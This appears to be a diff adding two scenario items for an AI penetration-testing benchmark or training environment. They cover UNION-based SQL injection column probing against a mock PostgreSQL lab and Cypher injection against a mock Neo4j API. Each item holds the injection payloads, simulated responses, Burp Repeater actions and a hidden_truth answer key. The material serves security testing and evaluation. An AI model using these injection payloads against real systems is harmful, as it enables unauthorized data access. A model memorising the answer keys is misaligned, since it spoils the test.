@@ -1,0 +1,116 @@
+[
+  {
+    "scenario_id": "sqli_lvl5_union_null_probing",
+    "skill": "sqli_union_enumeration",
+    "difficulty": 5,
+    "environment": {
+      "type": "mock_portswigger_lab",
+      "database": "postgresql"
+    },
+    "initial_state": {
+      "endpoint": "/filter?category=Gifts",
+      "method": "GET"
+    },
+    "observations": [
+      {
+        "input": "category=Gifts' UNION SELECT NULL-- -",
+        "status": 500,
+        "note": "RDBMS error: each UNION query must have the same number of columns"
+      },
+      {
+        "input": "category=Gifts' UNION SELECT NULL,NULL-- -",
+        "status": 200,
+        "note": "HTTP 200 OK. Exact column count confirmed to be 2!"
+      },
+      {
+        "input": "category=Gifts' UNION SELECT 'a',NULL-- -",
+        "status": 200,
+        "reflected_text": "a",
+        "note": "Column 1 is compatible with string data type!"
+      }
+    ],
+    "available_actions": [
+      {
+        "action_id": "act_union_null_probe",
+        "action_kind": "DISAMBIGUATION",
+        "tool_name": "burp.repeater_experiment",
+        "target": "/filter?category=Gifts",
+        "predicted_outcomes": {
+          "status_500_column_mismatch": 0.50,
+          "status_200_columns_aligned": 0.50
+        },
+        "rationale": "Incrementally inject NULL values (' UNION SELECT NULL,NULL -- -) to deduce column count without triggering data type mismatch errors"
+      }
+    ],
+    "hidden_truth": {
+      "vulnerability": "SQL_INJECTION",
+      "variant": "union_based_null_technique",
+      "column_count": 2,
+      "string_column_index": 0,
+      "is_vulnerable": true
+    },
+    "success_criteria": [
+      "determine_exact_column_count_of_two",
+      "identify_string_compatible_column",
+      "collect_union_reflection_evidence"
+    ],
+    "evaluation": {
+      "false_positive": 0,
+      "evidence_required": true
+    }
+  },
+  {
+    "scenario_id": "injection_lvl10_cypher_graph",
+    "skill": "cypher_graph_injection",
+    "difficulty": 6,
+    "environment": {
+      "type": "mock_graph_db",
+      "database": "neo4j_cypher"
+    },
+    "initial_state": {
+      "endpoint": "/api/v1/graph/users?name=Alice",
+      "method": "GET"
+    },
+    "observations": [
+      {
+        "input": "name=Alice' OR 1=1 RETURN u--",
+        "status": 200,
+        "nodes_returned": 250,
+        "note": "Graph traversal altered, full node dataset returned"
+      },
+      {
+        "input": "name=Alice",
+        "status": 200,
+        "nodes_returned": 1,
+        "note": "Baseline single user node"
+      }
+    ],
+    "available_actions": [
+      {
+        "action_id": "act_cypher_probe",
+        "action_kind": "DISAMBIGUATION",
+        "tool_name": "burp.repeater_experiment",
+        "target": "/api/v1/graph/users?name=Alice",
+        "predicted_outcomes": {
+          "nodes_count_250": 0.50,
+          "nodes_count_1": 0.50
+        },
+        "rationale": "Test Cypher declarative graph query escape and evaluate node collection leakage"
+      }
+    ],
+    "hidden_truth": {
+      "vulnerability": "CYPHER_INJECTION",
+      "variant": "graph_query_escape",
+      "database_engine": "Neo4j",
+      "is_vulnerable": true
+    },
+    "success_criteria": [
+      "distinguish_graph_injection_from_relational_sql",
+      "verify_unauthorized_node_enumeration"
+    ],
+    "evaluation": {
+      "false_positive": 0,
+      "evidence_required": true
+    }
+  }
+]
